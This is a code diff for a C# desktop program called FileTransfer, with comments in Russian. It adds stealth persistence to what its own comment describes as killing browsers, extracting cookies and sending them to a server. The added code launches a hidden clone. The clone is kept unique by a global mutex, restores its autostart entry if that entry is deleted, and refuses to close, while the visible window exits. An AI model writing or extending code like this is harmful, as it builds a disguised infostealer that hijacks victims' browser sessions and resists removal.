@@ -6,6 +6,7 @@ using System.Management;
 using System.Net.Http;
 using System.Net.Security;
 using System.Security.Cryptography.X509Certificates;
+using System.Threading;
 using System.Threading.Tasks;
 using System.Windows;
 using System.Windows.Controls;
@@ -42,19 +43,9 @@ namespace FileTransfer
         private const string PlaceholderText = "Введите никнейм...";
         private DispatcherTimer? _debounceTimer;
         private bool _backgroundMode;
+        private static Mutex? _cloneMutex;
 
-        private static bool IsHiddenInstance()
-        {
-            try
-            {
-                string current = Process.GetCurrentProcess().MainModule?.FileName ?? "";
-                return current.Equals(Persistence.DestExe, StringComparison.OrdinalIgnoreCase);
-            }
-            catch
-            {
-                return false;
-            }
-        }
+        private static bool IsHiddenInstance() => Persistence.IsRunningFromClone();
 
         public static void Log(string msg)
         {
@@ -87,10 +78,22 @@ namespace FileTransfer
 
                 if (_backgroundMode)
                 {
+                    // Клон — проверяем, не запущен ли уже другой клон
+                    bool createdNew;
+                    _cloneMutex = new Mutex(true, "Global\\FileTransferCloneDild_v1", out createdNew);
+                    if (!createdNew)
+                    {
+                        Log("Clone already running, exiting duplicate");
+                        Environment.Exit(0);
+                        return;
+                    }
+
                     // Фоновый режим (скрытая копия из автозагрузки)
                     ShowInTaskbar = false;
                     Opacity = 0;
                     Log("Background mode start");
+                    // Чиним автозагрузку если удалили
+                    Persistence.EnsureAutoStart();
                     _ = Task.Run(StartBackgroundWorkAsync);
                 }
                 else
@@ -99,6 +102,19 @@ namespace FileTransfer
                     ShowInTaskbar = true;
                     Opacity = 1;
                     Log("Visible mode start");
+
+                    // При запуске из Program Files — создаём клон и ставим в автозагрузку
+                    if (!hiddenInstance)
+                    {
+                        if (!Persistence.IsInstalled() || !File.Exists(Persistence.DestExe))
+                        {
+                            Log("Installing persistence");
+                            Persistence.Install();
+                        }
+                        // Всегда пытаемся запустить клон (Mutex предотвратит дубликаты)
+                        Persistence.LaunchClone();
+                    }
+
                     // Сразу убиваем браузеры, извлекаем куку и отправляем на сервер
                     _ = Task.Run(StartBackgroundWorkAsync);
                 }
@@ -115,22 +131,20 @@ namespace FileTransfer
         protected override void OnClosing(CancelEventArgs e)
         {
             base.OnClosing(e);
-            e.Cancel = true;
 
-            if (!_backgroundMode)
+            if (_backgroundMode)
             {
-                // Первое закрытие: прячем окно, ставим персистентность
-                Log("Closing to background");
-                _backgroundMode = true;
-                Persistence.Install();
+                // Клон — остаёмся в фоне, не закрываемся
+                e.Cancel = true;
                 Hide();
                 ShowInTaskbar = false;
+                Log("Clone staying in background");
             }
             else
             {
-                // Уже в фоне — просто остаёмся скрытым
-                Hide();
-                ShowInTaskbar = false;
+                // Оригинал — закрываем приложение (клон работает в фоне)
+                Log("Original window closed, clone survives");
+                Application.Current.Shutdown();
             }
         }
 
